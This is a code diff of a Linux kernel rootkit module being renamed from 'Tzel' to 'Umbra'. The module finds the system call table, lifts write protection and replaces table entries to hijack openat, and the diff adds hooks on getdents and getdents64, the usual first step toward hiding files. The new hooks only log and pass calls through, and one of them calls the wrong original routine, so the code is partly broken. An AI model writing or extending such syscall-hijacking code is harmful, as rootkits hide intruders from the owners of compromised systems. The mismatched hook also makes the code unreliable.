@@ -38,7 +38,6 @@ static void hook_syscall(unsigned int syscall_num, unsigned long hook)
     printk(KERN_INFO "Hooking...\n");
 
     printk(KERN_INFO "Original address: %lx\n", &sys_call_table[syscall_num]);
-    printk(KERN_INFO "Fake address: %lx\n", hook);
 
     unprotect_memory();
 
@@ -47,7 +46,7 @@ static void hook_syscall(unsigned int syscall_num, unsigned long hook)
 
     protect_memory();
 
-    printk(KERN_INFO "New address:  %lx\n", sys_call_table[syscall_num]);
+    printk(KERN_INFO "New address:      %lx\n", sys_call_table[syscall_num]);
 }
 
 static void unhook_all(void)
@@ -74,22 +73,51 @@ asmlinkage int sys_openat_hijack(int dirfd, const char __user *pathname, int fla
     return orig(dirfd, pathname, flags, mode);
 }
 
+asmlinkage int sys_getdents_hijack(unsigned int fd, struct linux_dirent *dirent, unsigned int count) 
+{ 
+    asmlinkage int (*orig)(unsigned int, struct linux_dirent *, unsigned int);
+    orig = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
+        (sys_call_table[__NR_getdents64]);
+
+    printk(KERN_INFO "HOOKED!!!\n");
+ 
+    return orig(fd, dirent, count);
+}
+
+asmlinkage int sys_getdents64_hijack(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) 
+{ 
+    asmlinkage int (*orig)(unsigned int, struct linux_dirent64 *, unsigned int);
+    orig = (asmlinkage int (*)(unsigned int, struct linux_dirent64 *, unsigned int))
+        (sys_call_table[__NR_getdents64]);
+
+    printk(KERN_INFO "HOOKED!!!\n");
+ 
+    return orig(fd, dirent, count);
+}
+
 static int __init init_rootkit(void)
 {
-    printk(KERN_INFO "Loading Tzel.\n");
+    printk(KERN_INFO "Loading Umbra.\n");
 
     sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
     
     printk(KERN_INFO "sys_call_table address: %px\n", sys_call_table);
 
+    printk(KERN_INFO "Hooking openat\n");
     hook_syscall(__NR_openat, (unsigned long)sys_openat_hijack);
+
+    printk(KERN_INFO "Hooking getdents\n");
+    hook_syscall(__NR_getdents, (unsigned long)sys_getdents_hijack);
+
+    printk(KERN_INFO "Hooking getdents64\n");
+    hook_syscall(__NR_getdents64, (unsigned long)sys_getdents64_hijack);
 
     return 0;
 }
 
 static void __exit cleanup_rootkit(void)
 {
-    printk(KERN_INFO "Cleaning up Tzel.\n");
+    printk(KERN_INFO "Cleaning up Umbra.\n");
     unhook_all();
 }  
 
